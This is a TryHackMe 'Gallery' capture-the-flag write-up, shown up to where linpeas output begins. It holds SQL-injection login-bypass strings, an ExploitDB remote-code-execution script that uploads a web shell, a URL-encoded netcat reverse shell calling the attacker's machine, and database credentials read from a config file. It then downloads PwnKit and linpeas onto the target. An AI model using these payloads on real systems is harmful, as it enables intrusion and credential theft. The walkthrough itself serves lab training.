---
Try to exploit our image gallery system
---

# Gallery — Writeup

## Overview
### Gallery — Writeup
### Gallery — Writeup
![111](https://tryhackme-images.s3.amazonaws.com/room-icons/c53a8eb73f24535345477fdf603fe1de.png)
### Deploy and get a Shell
Our gallery is not very well secured.
Designed and created by [Mikaa](https://twitter.com/mika_sec) !
```text
https://mikadmin.fr/blog/pentest-cheatsheet/

https://gist.github.com/jesusgavancho/d0063a1de1a91839b79914e552cfc507
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$  whoami | figlet
 _         _ _ 
| | ____ _| (_)
| |/ / _` | | |
|   < (_| | | |
|_|\_\__,_|_|_|
```

## Enumeration
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rustscan -a 10.10.19.103 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.19.103:80
Open 10.10.19.103:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 14:13 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Initiating Ping Scan at 14:13
Scanning 10.10.19.103 [2 ports]
Completed Ping Scan at 14:13, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:13
Completed Parallel DNS resolution of 1 host. at 14:13, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:13
Scanning 10.10.19.103 [2 ports]
Discovered open port 8080/tcp on 10.10.19.103
Discovered open port 80/tcp on 10.10.19.103
Completed Connect Scan at 14:13, 0.19s elapsed (2 total ports)
Initiating Service scan at 14:13
Scanning 2 services on 10.10.19.103
Completed Service scan at 14:13, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.19.103.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 5.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Nmap scan report for 10.10.19.103
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-23 14:13:30 EST for 14s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
|_http-favicon: Unknown favicon MD5: AC2148CFC4ABD06702A26F4F7CB95E09
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds

http://10.10.19.103:8080

http://10.10.19.103/gallery/login.php

sqli

admin'#

' or 1=1-- j

' or 1=1#

' or "x"="x"-- -
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ searchsploit Simple Image Gallery   
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
Joomla Plugin Simple Image Gallery Extended (SIGE) 3.5.3 - Multiple Vuln | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery Extended (SIGE) 3.2.3 | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated) | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL Injection                     | php/webapps/50198.txt
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ searchsploit -m php/webapps/50214.py 
  Exploit: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50214
     Path: /usr/share/exploitdb/exploits/php/webapps/50214.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (816)
Copied to: /home/kali/php-8.1.0-dev-backdoor-rce/50214.py
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ python3 50214.py   
TARGET = http://10.10.19.103:8080
Login Bypass
shell name TagokwdmwsifjbuowqbLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.19.103/gallery/uploads/1671824700_TagokwdmwsifjbuowqbLetta.php?cmd=whoami

url encode rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f (cyberchef)

encode all special characters

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E8%2E19%2E103%201337%20%3E%2Ftmp%2Ff

now will be

http://10.10.19.103/gallery/uploads/1671824700_TagokwdmwsifjbuowqbLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E8%2E19%2E103%201337%20%3E%2Ftmp%2Ff

revshell
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44588.
/bin/sh: 0: can't access tty; job control turned off
```
```text
$ whoami
www-data
```
```text
$ pwd
/var/www/html/gallery/uploads
```
```text
$ ls
1671824700_TagokwdmwsifjbuowqbLetta.php
gallery.png
no-image-available.png
user_1
```
```text
$ cd ..
```
```text
$ ls
404.html
albums
archives
assets
build
classes
config.php
create_account.php
database
dist
home.php
inc
index.php
initialize.php
login.php
plugins
report
schedules
system_info
uploads
user
```
```text
$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>

gallery_user:passw0rd321

let's stabilize shell
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44590.
/bin/sh: 0: can't access tty; job control turned off
```
```text
$ export TERM=xterm
```
```text
$ which python3
/usr/bin/python3
```

## Exploitation
```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gallery:/var/www/html/gallery/uploads$ 
zsh: suspended  rlwrap nc -lnvp 1337
```
```text
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ stty raw -echo ; fg
[1]  + continued  rlwrap nc -lnvp 1337
www-data@gallery:/var/www/html/gallery/uploads$ reset

www-data@gallery:/var/www/html/gallery/uploads$ mysql -u gallery_user -p
mysql -u gallery_user -p
Enter password: passw0rd321

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 616
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use gallery_db;
use gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1671824700_TagokwdmwsifjbuowqbLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-12-23 19:45:16 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)

MariaDB [gallery_db]> quit
quit
Bye

https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c
```
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ nano PwnKit.c
```
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ ls
PwnKit  PwnKit.c
```
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ python3 -m http.server 80                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.19.103 - - [23/Dec/2022 15:09:22] "GET /PwnKit HTTP/1.1" 200 -

www-data@gallery:/tmp$ mkdir witty
mkdir witty
www-data@gallery:/tmp$ cd witty
cd witty
www-data@gallery:/tmp/witty$ ls
ls
www-data@gallery:/tmp/witty$ wget http://10.8.19.103:80/PwnKit
wget http://10.8.19.103:80/PwnKit
--2022-12-23 20:09:22--  http://10.8.19.103/PwnKit
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16800 (16K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  16.41K  83.9KB/s    in 0.2s    

2022-12-23 20:09:23 (83.9 KB/s) - 'PwnKit' saved [16800/16800]

www-data@gallery:/tmp/witty$ chmod +x PwnKit
chmod +x PwnKit
www-data@gallery:/tmp/witty$ ./PwnKit
./PwnKit
www-data@gallery:/tmp/witty$ Exploit failed. Target is most likely patched.
whoami
whoami
www-data
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ locate linpeas
/home/kali/Downloads/linpeas.sh
/home/kali/hackthebox/linpeas.sh
```
```text
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ cd ../..
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.19.103 - - [23/Dec/2022 15:14:02] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@gallery:/tmp/witty$ wget http://10.8.19.103:80/linpeas.sh
wget http://10.8.19.103:80/linpeas.sh
--2022-12-23 20:14:01--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 758.81K   425KB/s    in 1.8s    

2022-12-23 20:14:04 (425 KB/s) - 'linpeas.sh' saved [777018/777018]

www-data@gallery:/tmp/witty$ ls
ls
PwnKit  linpeas.sh
www-data@gallery:/tmp/witty$ chmod +x linpeas.sh
chmod +x linpeas.sh

let's see

www-data@gallery:/tmp/witty$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄                                                
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                          
    |---------------------------------------------------------------------------|                          
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                          
    |         Follow on Twitter   :     @carlospolopm                           |                          
    |         Respect on HTB      :     SirBroccoli                             |                          
    |---------------------------------------------------------------------------|                          
    |                                 Thank you!                                |                          
    \---------------------------------------------------------------------------/                          
          linpeas-ng by carlospolop                                                                        
                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                       
                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗                                             
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════    
                                         ╚═══════════════════╝                                             
OS: Linux version 4.15.0-167-generic (buildd@lcy02-amd64-045) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: gallery
Writable folder: /dev/shm
